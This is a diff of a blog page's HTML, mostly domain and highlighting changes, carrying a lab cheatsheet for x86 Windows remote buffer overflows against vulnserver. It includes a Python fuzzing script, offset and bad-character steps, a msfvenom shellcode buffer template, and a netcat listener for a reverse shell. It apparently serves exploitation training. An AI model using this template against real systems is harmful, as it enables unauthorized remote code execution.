@@ -18,14 +18,14 @@ Prerequisites  Windows VM  Immunity Debugger PATH contains C:\python27 C:\python
 nmap -p- &amp;lt;ip&amp;gt; Connect to the port where the app listens on"/>
 <meta name="keywords" content="Windows, x86, Buffer Overflow, Cheatsheet"/>
 <meta name="robots" content="noodp"/>
-<link rel="canonical" href="https://fpkmatthi.xyz/posts/x86winbofnetw/" />
+<link rel="canonical" href="https://me.fpkmatthi.xyz/posts/x86winbofnetw/" />
 
 
 
 
-<link rel="stylesheet" href="https://fpkmatthi.xyz/assets/style.css">
+<link rel="stylesheet" href="https://me.fpkmatthi.xyz/assets/style.css">
 
-  <link rel="stylesheet" href="https://fpkmatthi.xyz/assets/blue.css">
+  <link rel="stylesheet" href="https://me.fpkmatthi.xyz/assets/blue.css">
 
 
 
@@ -33,9 +33,9 @@ nmap -p- &amp;lt;ip&amp;gt; Connect to the port where the app listens on"/>
 
 
 <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.1/css/all.css" integrity="sha384-50oBUHEmvpQ+1lW4y57PTFmhCaXp0ML5d60M1M7uH2+nqUivzIebhndOJK28anvf" crossorigin="anonymous">
-<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://fpkmatthi.xyz/img/apple-touch-icon-144-precomposed.png">
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://me.fpkmatthi.xyz/img/apple-touch-icon-144-precomposed.png">
 
-<link rel="shortcut icon" href="https://fpkmatthi.xyz/img/favicon/blue.png">
+<link rel="shortcut icon" href="https://me.fpkmatthi.xyz/img/favicon/blue.png">
 
 
 
@@ -44,7 +44,7 @@ nmap -p- &amp;lt;ip&amp;gt; Connect to the port where the app listens on"/>
 <meta name="twitter:description" content="Template code
 Prerequisites  Windows VM  Immunity Debugger PATH contains C:\python27 C:\python27\Pycommands\mona.py   Linux VM  Kali, Parrot, custom build   Both VMs need to contact each other A will to live  Windows VM  Launch Immunity Debugger as Administrator File &amp;gt; Open &amp;gt; vulnserver.exe Set it to run  Repeat after every crash  Linux VM Scan the victim IP
 nmap -p- &amp;lt;ip&amp;gt; Connect to the port where the app listens on" />
-<meta name="twitter:site" content="https://fpkmatthi.xyz" />
+<meta name="twitter:site" content="https://me.fpkmatthi.xyz" />
 <meta name="twitter:creator" content="Matthias Van De Velde" />
 <meta name="twitter:image" content="">
 
@@ -55,7 +55,7 @@ nmap -p- &amp;lt;ip&amp;gt; Connect to the port where the app listens on" />
 <meta property="og:description" content="Template code
 Prerequisites  Windows VM  Immunity Debugger PATH contains C:\python27 C:\python27\Pycommands\mona.py   Linux VM  Kali, Parrot, custom build   Both VMs need to contact each other A will to live  Windows VM  Launch Immunity Debugger as Administrator File &amp;gt; Open &amp;gt; vulnserver.exe Set it to run  Repeat after every crash  Linux VM Scan the victim IP
 nmap -p- &amp;lt;ip&amp;gt; Connect to the port where the app listens on" />
-<meta property="og:url" content="https://fpkmatthi.xyz/posts/x86winbofnetw/" />
+<meta property="og:url" content="https://me.fpkmatthi.xyz/posts/x86winbofnetw/" />
 <meta property="og:site_name" content="x86 Windows Remote Buffer Overflow Cheatsheet" />
 <meta property="og:image" content="">
 <meta property="og:image:width" content="2048">
@@ -140,7 +140,7 @@ nmap -p- &amp;lt;ip&amp;gt; Connect to the port where the app listens on" />
     
 <div class="post">
   <h1 class="post-title">
-    <a href="https://fpkmatthi.xyz/posts/x86winbofnetw/">x86 Windows Remote Buffer Overflow Cheatsheet</a></h1>
+    <a href="https://me.fpkmatthi.xyz/posts/x86winbofnetw/">x86 Windows Remote Buffer Overflow Cheatsheet</a></h1>
   <div class="post-meta">
       
     <span class="post-date">
@@ -158,13 +158,13 @@ nmap -p- &amp;lt;ip&amp;gt; Connect to the port where the app listens on" />
   
   <span class="post-tags">
     
-    #<a href="https://fpkmatthi.xyz/tags/windows/">Windows</a>&nbsp;
+    #<a href="https://me.fpkmatthi.xyz/tags/windows/">Windows</a>&nbsp;
     
-    #<a href="https://fpkmatthi.xyz/tags/x86/">x86</a>&nbsp;
+    #<a href="https://me.fpkmatthi.xyz/tags/x86/">x86</a>&nbsp;
     
-    #<a href="https://fpkmatthi.xyz/tags/buffer-overflow/">Buffer Overflow</a>&nbsp;
+    #<a href="https://me.fpkmatthi.xyz/tags/buffer-overflow/">Buffer Overflow</a>&nbsp;
     
-    #<a href="https://fpkmatthi.xyz/tags/cheatsheet/">Cheatsheet</a>&nbsp;
+    #<a href="https://me.fpkmatthi.xyz/tags/cheatsheet/">Cheatsheet</a>&nbsp;
     
   </span>
   
@@ -213,7 +213,7 @@ nmap -p- &amp;lt;ip&amp;gt; Connect to the port where the app listens on" />
 </li>
 <li>Create spike script for every command</li>
 </ol>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Bash" data-lang="Bash">s_readline<span style="color:#f92672">()</span>;
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Bash" data-lang="Bash">s_readline<span style="color:#f92672">(</span><span style="color:#f92672">)</span>;
 s_string<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;&lt;cmd&gt; &#34;</span><span style="color:#f92672">)</span>;
 s_string_variable<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">)</span>;
 </code></pre></div><ol start="3">
@@ -232,23 +232,23 @@ s_string_variable<span style="color:#f92672">(</span><span style="color:#e6db74"
 <span style="color:#f92672">import</span> sys<span style="color:#f92672">,</span> socket
 <span style="color:#f92672">from</span> time <span style="color:#f92672">import</span> sleep
 
-ip<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&lt;ip&gt;&#39;</span>
-port<span style="color:#f92672">=&lt;</span>port<span style="color:#f92672">&gt;</span>
+ip<span style="color:#f92672">=</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">&lt;ip&gt;</span><span style="color:#e6db74">&#39;</span>
+port<span style="color:#f92672">=</span><span style="color:#f92672">&lt;</span>port<span style="color:#f92672">&gt;</span>
 buffersize_incr<span style="color:#f92672">=</span><span style="color:#ae81ff">100</span>
-buffer<span style="color:#f92672">=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span>buffersize_incr
+buffer<span style="color:#f92672">=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">A</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span>buffersize_incr
 
 <span style="color:#66d9ef">while</span> True:
     <span style="color:#66d9ef">try</span>:
         s<span style="color:#f92672">=</span>socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET,socket<span style="color:#f92672">.</span>SOCK_STREAM)
         s<span style="color:#f92672">.</span>settimeout(<span style="color:#ae81ff">5</span>)         <span style="color:#75715e"># 5 seconds</span>
         s<span style="color:#f92672">.</span>connect((ip, port))   <span style="color:#75715e"># Note the double ()</span>
-        s<span style="color:#f92672">.</span>send(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&lt;cmd&gt; ./:/&#39;</span><span style="color:#f92672">+</span>buffer)
+        s<span style="color:#f92672">.</span>send(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">&lt;cmd&gt; ./:/</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">+</span>buffer)
         s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)            <span style="color:#75715e"># Important, otherwise it won&#39;t crash</span>
         s<span style="color:#f92672">.</span>close()
         sleep(<span style="color:#ae81ff">1</span>)                <span style="color:#75715e"># Don&#39;t forget to sleep, otherwise crash when sending to fast</span>
-        buffer<span style="color:#f92672">=</span>buffer<span style="color:#f92672">+</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span>buffersize_incr
+        buffer<span style="color:#f92672">=</span>buffer<span style="color:#f92672">+</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">A</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span>buffersize_incr
     <span style="color:#66d9ef">except</span>:
-        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;Crashed at {} bytes&#39;</span><span style="color:#f92672">.</span>format(str(len(buffer))))
+        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">Crashed at {} bytes</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>format(str(len(buffer))))
         sys<span style="color:#f92672">.</span>exit()
 </code></pre></div><h2 id="finding-offset">Finding offset<a href="#finding-offset" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
 <ol>
@@ -258,9 +258,9 @@ buffer<span style="color:#f92672">=</span><span style="color:#e6db74">b</span><s
 </code></pre></div><ol start="2">
 <li>Put the output of <code>pattern_create.rb</code> in the buffer</li>
 </ol>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Python" data-lang="Python"><span style="color:#f92672">...</span>
-buffer<span style="color:#f92672">=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&lt;pattern&gt;&#39;</span>
-<span style="color:#f92672">...</span>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Python" data-lang="Python"><span style="color:#f92672">.</span><span style="color:#f92672">.</span><span style="color:#f92672">.</span>
+buffer<span style="color:#f92672">=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">&lt;pattern&gt;</span><span style="color:#e6db74">&#39;</span>
+<span style="color:#f92672">.</span><span style="color:#f92672">.</span><span style="color:#f92672">.</span>
 </code></pre></div><ol start="3">
 <li>Take note of the <strong>EIP</strong> value in Immunity Debugger</li>
 <li>Get the exact offset</li>
@@ -283,13 +283,13 @@ buffer<span style="color:#f92672">=</span><span style="color:#e6db74">b</span><s
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Python" data-lang="Python"><span style="color:#75715e">#!/usr/bin/env python3</span>
 <span style="color:#f92672">from</span> __future__ <span style="color:#f92672">import</span> print_function
 <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">256</span>):
-    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">x&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;{:02x}&#34;</span><span style="color:#f92672">.</span>format(x), end<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>)
+    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">x</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{:02x}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(x), end<span style="color:#f92672">=</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">&#39;</span>)
 <span style="color:#66d9ef">print</span>()
 </code></pre></div><ol start="3">
 <li>Put the string of bad chars before the B&rsquo;s in your buffer:</li>
 </ol>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Python" data-lang="Python">badchars <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x01\x02\x03\x04\x05</span><span style="color:#e6db74">...</span><span style="color:#ae81ff">\xfb\xfc\xfd\xfe\xff</span><span style="color:#e6db74">&#34;</span>
-buffer <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*&lt;</span>offset<span style="color:#f92672">&gt;+</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;B&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">4</span><span style="color:#f92672">+</span>badchars
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Python" data-lang="Python">badchars <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x01</span><span style="color:#ae81ff">\x02</span><span style="color:#ae81ff">\x03</span><span style="color:#ae81ff">\x04</span><span style="color:#ae81ff">\x05</span><span style="color:#e6db74">...</span><span style="color:#ae81ff">\xfb</span><span style="color:#ae81ff">\xfc</span><span style="color:#ae81ff">\xfd</span><span style="color:#ae81ff">\xfe</span><span style="color:#ae81ff">\xff</span><span style="color:#e6db74">&#34;</span>
+buffer <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">A</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span><span style="color:#f92672">&lt;</span>offset<span style="color:#f92672">&gt;</span><span style="color:#f92672">+</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">B</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">4</span><span style="color:#f92672">+</span>badchars
 </code></pre></div><ol start="4">
 <li>Crash the app with the badchars and compare with mona:
 <ul>
@@ -344,15 +344,15 @@ msfvenom <span style="color:#ae81ff">\
 </span><span style="color:#ae81ff"></span>    -b <span style="color:#e6db74">&#34;&lt;bad chars&gt;&#34;</span>
 </code></pre></div><p><strong>NOTE:</strong> If an encoder was used (more than likely if bad chars are present, remember to prepend at least 16 NOPs (\x90) to the payload.)</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Python" data-lang="Python"><span style="color:#75715e">#!/usr/bin/env python3</span>
-prefix <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>
+prefix <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">&#34;</span>
 offset <span style="color:#f92672">=</span> <span style="color:#f92672">&lt;</span>offset<span style="color:#f92672">&gt;</span>
-overflow <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span>offset
-returnaddr <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&lt;JMP ESP addr&gt;&#34;</span>
-padding <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span> <span style="color:#75715e"># NOPs (e.g. \x90\x90\x90)</span>
-payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&lt;msfvenom output&gt;&#34;</span>
-postfix <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>
+overflow <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">A</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span>offset
+returnaddr <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">&lt;JMP ESP addr&gt;</span><span style="color:#e6db74">&#34;</span>
+padding <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">&#34;</span> <span style="color:#75715e"># NOPs (e.g. \x90\x90\x90)</span>
+payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">&lt;msfvenom output&gt;</span><span style="color:#e6db74">&#34;</span>
+postfix <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">&#34;</span>
 buffer <span style="color:#f92672">=</span> prefix <span style="color:#f92672">+</span> overflow <span style="color:#f92672">+</span> returnaddr <span style="color:#f92672">+</span> padding <span style="color:#f92672">+</span> payload <span style="color:#f92672">+</span> postfix
-<span style="color:#f92672">...</span>
+<span style="color:#f92672">.</span><span style="color:#f92672">.</span><span style="color:#f92672">.</span>
 </code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Bash" data-lang="Bash">sudo ufw disable
 nc -lvnp &lt;attacker port&gt;
 </code></pre></div><p>Finally, crash the app again and get shell :)</p>
@@ -376,7 +376,7 @@ nc -lvnp &lt;attacker port&gt;
       
       
       <span class="button next">
-        <a href="https://fpkmatthi.xyz/posts/brainpan/">
+        <a href="https://me.fpkmatthi.xyz/posts/brainpan/">
           <span class="button__text">Vulnhub - Brainpan</span>
           <span class="button__icon">→</span>
         </a>
@@ -404,8 +404,8 @@ nc -lvnp &lt;attacker port&gt;
   </div>
 </footer>
 
-<script src="https://fpkmatthi.xyz/assets/main.js"></script>
-<script src="https://fpkmatthi.xyz/assets/prism.js"></script>
+<script src="https://me.fpkmatthi.xyz/assets/main.js"></script>
+<script src="https://me.fpkmatthi.xyz/assets/prism.js"></script>
 
 
 
